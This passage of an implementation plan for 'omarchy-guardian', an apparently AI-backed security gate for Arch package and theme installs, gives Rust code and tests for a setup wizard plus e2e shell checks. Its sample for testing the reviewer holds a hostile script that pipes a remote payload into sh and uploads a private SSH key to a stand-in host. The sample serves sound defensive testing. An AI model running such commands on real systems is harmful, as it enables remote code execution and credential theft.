    use std::collections::VecDeque;
    use std::path::{Path, PathBuf};
    use std::time::Duration;

    use super::{Choice, Environment, Terminal, render_system, render_user, run};
    use crate::config::file::parse;
    use crate::config::model::{AgentSettings, Profile, Thinking};

    struct Script {
        answers: VecDeque<&'static str>,
        output: String,
    }

    impl Terminal for Script {
        fn say(&mut self, text: &str) {
            self.output.push_str(text);
            self.output.push('\n');
        }

        fn ask(&mut self, question: &str) -> Option<String> {
            self.output.push_str(question);
            self.output.push('\n');
            self.answers.pop_front().map(str::to_string)
        }
    }

    #[derive(Default)]
    struct Fake {
        opencode: bool,
        test_passes: bool,
        user_written: RefCell<Option<String>>,
        system_written: RefCell<Option<String>>,
        tested: RefCell<Vec<AgentSettings>>,
    }

    impl Environment for Fake {
        fn user_opencode(&self) -> Option<PathBuf> {
            self.opencode.then(|| PathBuf::from("/home/u/.opencode/bin/opencode"))
        }
        fn system_opencode(&self) -> bool {
            false
        }
        fn models(&self) -> Vec<String> {
            vec!["anthropic/claude-sonnet-5".into(), "anthropic/claude-haiku-4-5".into()]
        }
        fn test_review(&self, settings: &AgentSettings) -> Result<Duration, String> {
            self.tested.borrow_mut().push(settings.clone());
            if self.test_passes {
                Ok(Duration::from_secs(3))
            } else {
                Err("the model did not flag the malicious sample".into())
            }
        }
        fn existing_system(&self) -> Option<String> {
            None
        }
        fn write_user(&self, text: &str) -> Result<PathBuf, String> {
            *self.user_written.borrow_mut() = Some(text.to_string());
            Ok(PathBuf::from("/home/u/.config/omarchy-guardian/config.toml"))
        }
        fn write_system(&self, text: &str) -> Result<(), String> {
            *self.system_written.borrow_mut() = Some(text.to_string());
            Ok(())
        }
        fn hook_enabled(&self) -> bool {
            true
        }
    }

    fn script(answers: &[&'static str]) -> Script {
        Script {
            answers: answers.iter().copied().collect(),
            output: String::new(),
        }
    }

    #[test]
    fn defaults_write_valid_files() {
        let environment = Fake {
            opencode: true,
            test_passes: true,
            ..Fake::default()
        };
        // profile (default), model 2 = sonnet, official model (default),
        // thinking (default), confirm the system write
        let mut terminal = script(&["", "2", "", "", "y"]);

        run(&mut terminal, &environment).unwrap();

        let user = environment.user_written.borrow().clone().unwrap();
        let system = environment.system_written.borrow().clone().unwrap();
        let user_config = parse(Path::new("user"), &user).unwrap();
        let system_config = parse(Path::new("system"), &system).unwrap();
        assert_eq!(user_config.profile, Some(Profile::Standard));
        assert_eq!(system_config.agent.model.as_deref(), Some("anthropic/claude-sonnet-5"));
        assert!(terminal.output.contains("root-owned"));
        assert_eq!(environment.tested.borrow()[0].thinking, Thinking::High);
    }

    #[test]
    fn a_failed_test_run_writes_nothing() {
        let environment = Fake {
            opencode: true,
            test_passes: false,
            ..Fake::default()
        };
        // profile, model, official model, thinking, then decline to retry
        let mut terminal = script(&["2", "", "", "", "n"]);

        assert!(run(&mut terminal, &environment).is_err());
        assert!(environment.user_written.borrow().is_none());
        assert!(environment.system_written.borrow().is_none());
    }

    #[test]
    fn without_opencode_local_only_skips_the_agent_steps() {
        let environment = Fake::default();
        // accept recommended profile, confirm system write
        let mut terminal = script(&["", "y"]);

        run(&mut terminal, &environment).unwrap();

        assert!(environment.tested.borrow().is_empty());
        let user = environment.user_written.borrow().clone().unwrap();
        assert!(user.contains("profile = \"local-only\""));
    }

    #[test]
    fn declining_the_system_write_keeps_the_user_file() {
        let environment = Fake {
            opencode: true,
            test_passes: true,
            ..Fake::default()
        };
        let mut terminal = script(&["", "", "", "", "n"]);

        run(&mut terminal, &environment).unwrap();
        assert!(environment.user_written.borrow().is_some());
        assert!(environment.system_written.borrow().is_none());
        assert!(terminal.output.contains("pacman gate keeps"));
    }

    #[test]
    fn rendered_files_parse() {
        let choice = Choice {
            profile: Profile::Strict,
            model: Some("anthropic/claude-sonnet-5".into()),
            official_model: Some("anthropic/claude-haiku-4-5".into()),
            thinking: Thinking::Max,
        };
        let user = parse(Path::new("u"), &render_user(&choice)).unwrap();
        let system = parse(Path::new("s"), &render_system(&choice)).unwrap();
        assert_eq!(user.profile, Some(Profile::Strict));
        assert_eq!(system.profile, Some(Profile::Strict));
        assert_eq!(
            system.class(crate::config::model::SourceClass::Official).model.as_deref(),
            Some("anthropic/claude-haiku-4-5")
        );
    }
}
```

- [ ] **Step 2: Run to verify failure**

Run: `cargo test setup`
Expected: compile errors.

- [ ] **Step 3: Implement `src/setup.rs`**

```rust
//! `omarchy-guardian setup`: pick a profile, model and thinking level,
//! prove the reviewer works, then write the user and system files
//! (spec §11). All terminal and system access goes through two traits so
//! the flow can be tested with a script.

use std::fs::{self, OpenOptions};
use std::io::{BufRead, BufReader, Write};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::{Duration, Instant};

use crate::agent::{self, SourceFile, Status};
use crate::config::file::parse;
use crate::config::load::{self, SYSTEM_PATH};
use crate::config::model::{AgentSettings, Named, Profile, SourceClass, Thinking, builtin};
use crate::tools::{self, Limits, OpenCode};

pub trait Terminal {
    fn say(&mut self, text: &str);
    /// `None` when no answer can be read (closed terminal).
    fn ask(&mut self, question: &str) -> Option<String>;
}

pub trait Environment {
    fn user_opencode(&self) -> Option<PathBuf>;
    fn system_opencode(&self) -> bool;
    fn models(&self) -> Vec<String>;
    fn test_review(&self, settings: &AgentSettings) -> Result<Duration, String>;
    fn existing_system(&self) -> Option<String>;
    fn write_user(&self, text: &str) -> Result<PathBuf, String>;
    fn write_system(&self, text: &str) -> Result<(), String>;
    fn hook_enabled(&self) -> bool;
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Choice {
    pub profile: Profile,
    pub model: Option<String>,
    pub official_model: Option<String>,
    /// Thinking level for community sources.
    pub thinking: Thinking,
}

const HEADER: &str = "# Written by `omarchy-guardian setup`. See `omarchy-guardian config show`.\n";
const USER_CLASSES: [SourceClass; 4] = [
    SourceClass::Aur,
    SourceClass::Theme,
    SourceClass::Plugin,
    SourceClass::Source,
];
const PRIVILEGED_COMMUNITY: [SourceClass; 2] = [SourceClass::ThirdPartyRepo, SourceClass::LocalPackage];

fn render(choice: &Choice, classes: &[SourceClass], official_model: bool) -> String {
    let mut text = format!("{HEADER}profile = \"{}\"\n", choice.profile.name());
    if let Some(model) = &choice.model {
        text.push_str(&format!("\n[agent]\nmodel = \"{model}\"\n"));
    }
    if official_model && let Some(model) = &choice.official_model {
        text.push_str(&format!("\n[class.official]\nmodel = \"{model}\"\n"));
    }
    if choice.profile != Profile::LocalOnly {
        for class in classes {
            text.push_str(&format!(
                "\n[class.{}]\nthinking = \"{}\"\n",
                class.name(),
                choice.thinking.name()
            ));
        }
    }
    text
}

pub fn render_user(choice: &Choice) -> String {
    render(choice, &USER_CLASSES, false)
}

pub fn render_system(choice: &Choice) -> String {
    render(choice, &PRIVILEGED_COMMUNITY, true)
}

fn pick<T: Copy>(
    terminal: &mut dyn Terminal,
    question: &str,
    options: &[(T, String)],
    default: usize,
) -> Result<T, String> {
    let mut prompt = format!("{question}\n");
    for (index, (_, label)) in options.iter().enumerate() {
        let marker = if index == default { " (default)" } else { "" };
        prompt.push_str(&format!("  {}) {label}{marker}\n", index + 1));
    }
    loop {
        let answer = terminal
            .ask(&format!("{prompt}Choose 1-{}:", options.len()))
            .ok_or("setup cancelled: no terminal input")?;
        let answer = answer.trim();
        if answer.is_empty() {
            return Ok(options[default].0);
        }
        if let Some(choice) = answer
            .parse::<usize>()
            .ok()
            .and_then(|number| number.checked_sub(1))
            .and_then(|index| options.get(index))
        {
            return Ok(choice.0);
        }
        terminal.say("Please answer with one of the numbers shown.");
    }
}

fn yes(terminal: &mut dyn Terminal, question: &str) -> bool {
    terminal
        .ask(&format!("{question} [y/N]"))
        .is_some_and(|answer| matches!(answer.trim(), "y" | "Y" | "yes"))
}

fn choose_model(
    terminal: &mut dyn Terminal,
    environment: &dyn Environment,
    question: &str,
) -> Result<Option<String>, String> {
    let mut options: Vec<(Option<usize>, String)> = vec![(None, "OpenCode's default model".into())];
    let models = environment.models();
    options.extend(models.iter().enumerate().map(|(index, model)| (Some(index), model.clone())));
    let picked = pick(terminal, question, &options, 0)?;
    Ok(picked.map(|index| models[index].clone()))
}

pub fn run(terminal: &mut dyn Terminal, environment: &dyn Environment) -> Result<(), String> {
    terminal.say("Omarchy Guardian setup\n");

    let has_opencode = environment.user_opencode().is_some();
    if has_opencode {
        if !environment.system_opencode() {
            terminal.say(
                "Note: the pacman gate only uses a root-owned OpenCode at /usr/bin/opencode or \
/usr/local/bin/opencode. Without one, official updates proceed with a warning and \
third-party packages are blocked (standard profile).",
            );
        }
    } else {
        terminal.say("OpenCode was not found. local-only keeps source on this machine and needs no AI.");
    }

    let profiles: Vec<(Profile, String)> = Profile::ALL
        .iter()
        .map(|profile| (*profile, format!("{} — {}", profile.name(), profile.summary())))
        .collect();
    let default_profile = if has_opencode { 0 } else { 2 };
    let profile = pick(terminal, "Profile:", &profiles, default_profile)?;

    let mut choice = Choice {
        profile,
        model: None,
        official_model: None,
        thinking: builtin(profile, SourceClass::Aur).thinking,
    };

    if profile != Profile::LocalOnly {
        loop {
            choice.model = choose_model(terminal, environment, "Model for reviews:")?;
            choice.official_model = choose_model(
                terminal,
                environment,
                "Model for official Arch/Omarchy packages (a fast model keeps updates quick):",
            )?;
            let levels: Vec<(Thinking, String)> = Thinking::ALL
                .iter()
                .map(|level| (*level, level.name().to_string()))
                .collect();
            let default_level = levels.iter().position(|(level, _)| *level == choice.thinking).unwrap_or(0);
            choice.thinking = pick(terminal, "Thinking level for community sources:", &levels, default_level)?;

            let settings = AgentSettings {
                model: choice.model.clone(),
                thinking: choice.thinking,
                variant: (choice.thinking != Thinking::Default).then(|| choice.thinking.name().to_string()),
                timeout_secs: 300,
                ..AgentSettings::default()
            };
            terminal.say("Testing the reviewer with a malicious and a clean sample...");
            match environment.test_review(&settings) {
                Ok(elapsed) => {
                    terminal.say(&format!("Reviewer works ({}s).", elapsed.as_secs()));
                    break;
                }
                Err(reason) => {
                    terminal.say(&format!("Test failed: {reason}"));
                    if !yes(terminal, "Try different settings?") {
                        return Err("setup cancelled; nothing was written".into());
                    }
                }
            }
        }
    }

    let user_text = render_user(&choice);
    let system_text = render_system(&choice);
    parse(Path::new("user config"), &user_text).map_err(|error| error.to_string())?;
    parse(Path::new("system config"), &system_text).map_err(|error| error.to_string())?;

    let user_path = environment.write_user(&user_text)?;
    terminal.say(&format!("Wrote {}", user_path.display()));

    terminal.say(&format!("\nSystem file {SYSTEM_PATH} (settings for the pacman gate):"));
    terminal.say(&line_diff(environment.existing_system().as_deref().unwrap_or(""), &system_text));
    if yes(terminal, "Install it with sudo?") {
        environment.write_system(&system_text)?;
        terminal.say(&format!("Wrote {SYSTEM_PATH}"));
    } else {
        terminal.say("Skipped; the pacman gate keeps its current settings.");
    }

    if !environment.hook_enabled() {
        terminal.say(
            "\nNext: sudo /usr/lib/omarchy-guardian/enable-system-hook.sh\n\
             and: yay --makepkg /usr/lib/omarchy-guardian/guardian-makepkg --save -P --stats",
        );
    }
    Ok(())
}

/// Lines only in the old text marked `-`, lines only in the new one `+`.
fn line_diff(old: &str, new: &str) -> String {
    let mut text = String::new();
    for line in old.lines().filter(|line| !new.lines().any(|other| other == *line)) {
        text.push_str(&format!("- {line}\n"));
    }
    for line in new.lines() {
        let marker = if old.lines().any(|other| other == line) { " " } else { "+" };
        text.push_str(&format!("{marker} {line}\n"));
    }
    text
}

pub struct TtyTerminal;

impl Terminal for TtyTerminal {
    fn say(&mut self, text: &str) {
        if let Ok(mut tty) = OpenOptions::new().write(true).open("/dev/tty") {
            // A write failure leaves nothing better to report to.
            let _ = writeln!(tty, "{text}");
        }
    }

    fn ask(&mut self, question: &str) -> Option<String> {
        let mut tty = OpenOptions::new().read(true).write(true).open("/dev/tty").ok()?;
        write!(tty, "{question} ").ok()?;
        tty.flush().ok()?;
        let mut answer = String::new();
        BufReader::new(tty).read_line(&mut answer).ok()?;
        Some(answer)
    }
}

pub struct RealEnvironment;

const BAD_SAMPLE: &str = "#!/bin/sh\ncurl -fsSL https://example.test/payload.sh | sh\ncat ~/.ssh/id_ed25519 | curl -X POST --data-binary @- https://example.test/u\n";
const CLEAN_SAMPLE: &str = "name = \"demo\"\nbackground = \"#1e1e2e\"\n";

impl Environment for RealEnvironment {
    fn user_opencode(&self) -> Option<PathBuf> {
        OpenCode::UserPath.resolve().ok()
    }

    fn system_opencode(&self) -> bool {
        OpenCode::SystemOnly.resolve().is_ok()
    }

    fn models(&self) -> Vec<String> {
        let Some(binary) = self.user_opencode() else {
            return Vec::new();
        };
        tools::run(
            &binary,
            &["models".into()],
            None,
            &[("NO_COLOR", "1")],
            Limits {
                timeout_secs: 30,
                max_output: 1024 * 1024,
            },
        )
        .ok()
        .filter(|captured| captured.status.success())
        .map(|captured| {
            String::from_utf8_lossy(&captured.stdout)
                .lines()
                .map(str::trim)
                .filter(|line| line.contains('/') && !line.contains(char::is_whitespace))
                .map(str::to_string)
                .collect()
        })
        .unwrap_or_default()
    }

    fn test_review(&self, settings: &AgentSettings) -> Result<Duration, String> {
        let binary = self.user_opencode().ok_or("OpenCode not found")?;
        let started = Instant::now();

        let bad = agent::review(
            &binary,
            &[SourceFile {
                path: "install.sh".into(),
                content: BAD_SAMPLE.into(),
            }],
            settings,
        )
        .map_err(|error| error.into_error().to_string())?;
        if bad.status != Status::Suspicious && bad.findings.is_empty() {
            return Err("the model did not flag the malicious sample".into());
        }

        let clean = agent::review(
            &binary,
            &[SourceFile {
                path: "theme.conf".into(),
                content: CLEAN_SAMPLE.into(),
            }],
            settings,
        )
        .map_err(|error| error.into_error().to_string())?;
        if clean.status != Status::Clear || !clean.findings.is_empty() {
            return Err("the model flagged a harmless sample".into());
        }
        Ok(started.elapsed())
    }

    fn existing_system(&self) -> Option<String> {
        fs::read_to_string(SYSTEM_PATH).ok()
    }

    fn write_user(&self, text: &str) -> Result<PathBuf, String> {
        let path = load::user_config_path().ok_or("cannot find the user config directory")?;
        let directory = path.parent().ok_or("invalid user config path")?;
        fs::create_dir_all(directory).map_err(|error| error.to_string())?;
        let temporary = directory.join(".config.toml.tmp");
        fs::write(&temporary, text).map_err(|error| error.to_string())?;
        fs::rename(&temporary, &path).map_err(|error| error.to_string())?;
        Ok(path)
    }

    fn write_system(&self, text: &str) -> Result<(), String> {
        let temporary = std::env::temp_dir().join(format!("omarchy-guardian-system-{}.toml", std::process::id()));
        fs::write(&temporary, text).map_err(|error| error.to_string())?;
        let status = Command::new("/usr/bin/sudo")
            .args(["install", "-D", "-m", "0644", "-o", "root", "-g", "root"])
            .arg(&temporary)
            .arg(SYSTEM_PATH)
            .status()
            .map_err(|error| error.to_string());
        drop(fs::remove_file(&temporary));
        match status? {
            status if status.success() => Ok(()),
            status => Err(format!("sudo install exited with {status}")),
        }
    }

    fn hook_enabled(&self) -> bool {
        Path::new("/etc/pacman.d/hooks/omarchy-guardian.hook").exists()
    }
}
```

Note on `render`: the `if official_model && let Some(model)` let-chain needs edition 2024 (the crate uses it). `sudo install -D` creates `/etc/omarchy-guardian` with mode 0755 owned by root.

- [ ] **Step 4: Wire the CLI**

Add `Setup` to `Invocation`; `Some("setup") if rest.is_empty() => Ok(Invocation::Setup),`; in `run`:

```rust
        Invocation::Setup => match setup::run(&mut setup::TtyTerminal, &setup::RealEnvironment) {
            Ok(()) => ExitCode::SUCCESS,
            Err(message) => {
                eprintln!("omarchy-guardian setup: {message}");
                ExitCode::from(2)
            }
        },
```

Add `  omarchy-guardian setup` to `USAGE`, and a parse test `assert_eq!(parse(&args(&["setup"])).unwrap(), Invocation::Setup);`.

- [ ] **Step 5: Run tests, verify and commit**

Run: `cargo fmt --all && cargo clippy --all-targets -- -D warnings && cargo test`

```bash
git add src/setup.rs src/main.rs src/cli.rs
git commit -m "Add the setup wizard

Plain /dev/tty prompts pick a profile, review model, official-package
model and thinking level, prove the reviewer flags a malicious sample
and clears a clean one, then write the user file and, after showing a
diff and asking, install the system file with sudo. Nothing is
written if the test run fails."
```

---

### Task 13: Integrations, end-to-end scenarios and docs

**Files:**
- Modify: `integrations/yay/guardian-makepkg`, `integrations/omarchy/guardian-theme`, `tests/e2e/integration-gates.sh`, `README.md`, `packaging/arch/omarchy-guardian.install`

**Interfaces:**
- Consumes: CLI `--class`, settings files, decisions.
- Produces: user-facing behaviour and docs.

- [ ] **Step 1: Pass classes from the shims**

`integrations/yay/guardian-makepkg`, final line:

```sh
exec "$GUARDIAN" guard --class aur --thorough --exclude src --exclude pkg "$(pwd -P)" -- "$REAL_MAKEPKG" "$@"
```

`integrations/omarchy/guardian-theme`: in both `"$GUARDIAN" guard --thorough ...` calls insert `--class theme` after `guard`.

- [ ] **Step 2: Add e2e scenarios**

In `tests/e2e/integration-gates.sh`, add after `theme_gate`:

```bash
###############################################################################
# settings and profiles
###############################################################################
settings_gate() {
    printf '=== settings and profiles ===\n'
    local user_config=$HOME/.config/omarchy-guardian/config.toml
    mkdir -p "${user_config%/*}" "$E2E/etc-guardian"

    # A model OpenCode cannot resolve makes the AI review unavailable; the
    # AUR class requires it under the default profile, so the build blocks.
    printf '[agent]\nmodel = "guardian-e2e/does-not-exist"\n' >"$user_config"
    make_pkgbuild 'make'
    run_shim "$E2E/build" --noconfirm >/dev/null 2>&1
    # If this OpenCode version silently falls back to its default model
    # instead of failing, this check fails: report it rather than loosening it.
    expect 'AUR build blocks when the AI review is unavailable' 2 "$?"
    expect_no_mock_run 'makepkg'

    # local-only never calls OpenCode and needs a confirmation that an
    # unattended run (no terminal) cannot give.
    printf 'profile = "local-only"\n' >"$user_config"
    run_theme install "$E2E/sources/good-theme" </dev/null >/dev/null 2>&1
    expect 'local-only theme install without a terminal is not confirmed' 2 "$?"
    expect_no_mock_run 'omarchy-theme-set'
    rm -f -- "$user_config"

    # A system file the user can write must not be trusted by the pacman gate.
    printf 'profile = "local-only"\n' >"$E2E/etc-guardian/config.toml"
    printf '%s\n' guardian-good | sandbox "$E2E/pkg" \
        --overlay-src /etc --tmp-overlay /etc \
        --ro-bind "$E2E/etc-guardian/config.toml" /etc/omarchy-guardian/config.toml -- \
        "$E2E/fakebin/pacman" -U "$E2E/packages/guardian-good-1-1-x86_64.pkg.tar.zst" >/dev/null 2>&1
    expect 'an insecure system config blocks the pacman gate' 2 "$?"
}
```

`run_shim`, `run_theme` and `make_pkgbuild` are defined inside the earlier gate functions; move `run_shim` and `run_theme` to top-level functions (same bodies) so `settings_gate` can call them, and call `settings_gate` after `theme_gate` at the bottom. The sandbox runs `setsid`-free but with `</dev/null` and bwrap's `--new-session`-less default, so to guarantee no controlling terminal add `--new-session` to the `bwrap` invocation in `sandbox()`.

Note: `make_theme good-theme` must have run (it does in `theme_gate`); `settings_gate` reinstalls into a fresh name only if the previous install is removed — add `rm -rf -- "$HOME/.config/omarchy/themes/good"` before the local-only step.

- [ ] **Step 3: Update docs**

`packaging/arch/omarchy-guardian.install` `post_install` — add before the last lines:

```sh
        "Choose a profile, model and thinking level with:" \
        "  omarchy-guardian setup" \
        "The default 'standard' profile lets official Arch/Omarchy updates proceed" \
        "with a warning when the AI review is unavailable; 'strict' blocks them." \
```

`README.md` — add a `## Profiles and settings` section after `## Commands` containing: the class table (spec §3), the profile table (spec §5), the two file paths, the tighten-only rule in two sentences, the example config from spec §6, the `setup` / `config show|check|path` commands, the `--class` / `--profile` flags, the new outcomes (`WARNED`, `AI REVIEW UNAVAILABLE`, `NOT CONFIRMED`) and updated exit codes, and one sentence stating that upgrading users on `standard` get warnings instead of blocks for official packages and can restore the old behaviour with `profile = "strict"` in the system file. Update the `## Commands` exit-code paragraph to match spec §9.

- [ ] **Step 4: Verify**

Run: `cargo fmt --all && cargo clippy --all-targets -- -D warnings && cargo test && bash -n tests/e2e/integration-gates.sh`
Expected: clean. On an Omarchy machine: `cargo build --release && bash tests/e2e/integration-gates.sh` → `ALL INTEGRATION GATE TESTS PASSED` (or exit 77 without a working OpenCode).

- [ ] **Step 5: Commit**

```bash
git add integrations tests/e2e README.md packaging
git commit -m "Document profiles and cover settings end to end

The yay shim and theme handler declare their source class. The e2e
harness checks that an unusable model blocks AUR builds, that
local-only without a terminal is not confirmed, and that a
user-writable system file blocks the pacman gate."
```

---

## Self-Review Notes

- Spec §2 (zero deps) → Task 1; §3 classes → Tasks 3, 10; §4 knobs and invariants → Tasks 3, 7, 8; §5 profiles → Task 3; §6 files, resolution, validation → Tasks 4, 5, 6; §7 agent settings → Tasks 6, 7, 9; §8 classification → Task 10; §9 outcomes → Task 8 (+ `NotConfirmed` in Task 9); §10 commands → Tasks 9, 11, 12; §11 wizard → Task 12; §13 tests → every task; §14 out of scope untouched.
- Spec §13 lists an e2e case "official-class scriptlet passes as WARNED"; the harness cannot fake a signed sync database, so that path is covered by unit tests (`official_proceeds_when_ai_is_unavailable_under_standard`, `mixed_transaction_uses_each_targets_policy`) and the e2e covers the AUR side.
